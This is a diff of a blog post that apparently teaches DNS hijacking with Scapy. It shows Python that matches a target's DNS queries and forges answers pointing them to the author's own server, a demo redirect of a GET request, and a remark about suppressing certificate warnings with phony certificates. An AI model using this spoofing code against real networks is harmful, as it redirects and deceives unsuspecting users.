@@ -66,7 +66,7 @@ Now, since all the DNS messages are dropped, we need to provide the target with 
 if (pkt[IP].src == g_target_ip and
 		pkt.haslayer(DNS) and
 		pkt[DNS].qr == 0 and				# DNS Query
-		pkt[DNS].opcode == 0 and			# DNS Standard Query
+		pkt[DNS].opcode == 0 and		# DNS Standard Query
 		pkt[DNS].ancount == 0				# Answer Count
 		):
 
@@ -84,14 +84,14 @@ if (pkt[IP].src == g_target_ip and
 					sport=53
 					)/ \
 				DNS(
-					id=pkt[DNS].id,					# Same as query
+					id=pkt[DNS].id,				# Same as query
 					ancount=1,						# Number of answers
-					qr=1,							# DNS Response
-					ra=1,							# Recursion available
+					qr=1,									# DNS Response
+					ra=1,									# Recursion available
 					qd=(pkt.getlayer(DNS)).qd,		# Query Data
 					an=DNSRR(
 						rrname=pkt[DNSQR].qname,	# Queried host name
-						rdata=g_server_ip,	# IP address of queried host name
+						rdata=g_server_ip,				# IP address of queried host name
 						ttl = 10
 						)
 					)
@@ -131,7 +131,8 @@ Once the DNS hijacker and the web server are started, sending a request from my 
 
 ![pwned](../../assets/videos/pwned.gif)
 
-We can see that a GET request to `victoria.dev` was successfully redirected to our webpage. yaaa.
-That's it for this post. The full script is available on my github [page][page].
+We can see that a GET request to `victoria.dev` was successfully redirected to our webpage. yaaa. Note that the warning can be removed by supplying phony certificates, but that topic is for another post. Bye.
+
+The full script is available on my github [page][page].
 
 [page]: https://github.com/venkat-abhi/dns-redirector
